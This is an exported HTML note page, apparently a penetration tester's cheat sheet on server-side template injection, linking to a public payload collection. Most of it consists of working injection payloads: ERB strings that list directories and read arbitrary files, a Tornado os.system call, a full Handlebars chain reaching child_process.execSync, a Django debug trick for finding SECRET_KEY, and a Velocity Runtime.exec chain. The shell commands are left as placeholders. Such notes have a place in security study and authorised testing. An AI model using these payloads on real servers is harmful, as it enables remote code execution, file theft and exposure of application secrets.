<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Template Syntax</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Template Syntax</h1><br/><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker---code-execution">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker---code-execution</a><br /><br /><strong>ERB</strong><br />• List all directories<br /><code>&lt;%= Dir.entries(&#39;/&#39;) %&gt;</code><br />• Read arbitrary files<br /><code>&lt;%= File.open(&#39;/example/arbitrary-file&#39;).read %&gt;</code><br />• Ruby language<br />• system() to execute stuff<br />• ‘’<br />• Execute stuff<br /><code>&lt;%= STUFF %&gt;</code><br /><br /><strong>Tornado</strong><br />• Python Language<br />• {{}}<br />• {% %}<br />{% import os %}{{os.system(&quot;do stuff&quot;)}}<br /><strong><br />HandleBars RCE</strong><br />{{#with &quot;s&quot; as |string|}}<br />  {{#with &quot;e&quot;}}<br />    {{#with split as |conslist|}}<br />      {{this.pop}}<br />      {{this.push (lookup string.sub &quot;constructor&quot;)}}<br />      {{this.pop}}<br />      {{#with string.split as |codelist|}}<br />        {{this.pop}}<br />        {{this.push &quot;return require(&#39;child_process&#39;).execSync(&#39;<strong><span style="text-decoration:underline;">ADD YOUR STUFF</span></strong>&#39;);&quot;}}<br />        {{this.pop}}<br />        {{#each conslist}}<br />          {{#with (string.sub.apply 0 codelist)}}<br />            {{this}}<br />          {{/with}}<br />        {{/each}}<br />      {{/with}}<br />    {{/with}}<br />  {{/with}}<br />{{/with}}<br /><br /><strong>Django</strong><br />• {%+debug+%} will list out all the variables<br />• Look for the settings object<br />   ◇ contains SECRET_KEY attribute<br /><strong><br />Java</strong><br />             For example, in the Java-based template engine Velocity, you have access to a <code>ClassTool</code> object called <code>$class</code>. Studying the documentation reveals that you can chain the <code>$class.inspect()</code> method and <code>$class.type</code>  property to obtain references to arbitrary objects. In the past, this  has been exploited to execute shell commands on the target system as  follows:         <br />                     <code>$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;bad-stuff-here&quot;)</code>         <br /></div></body></html>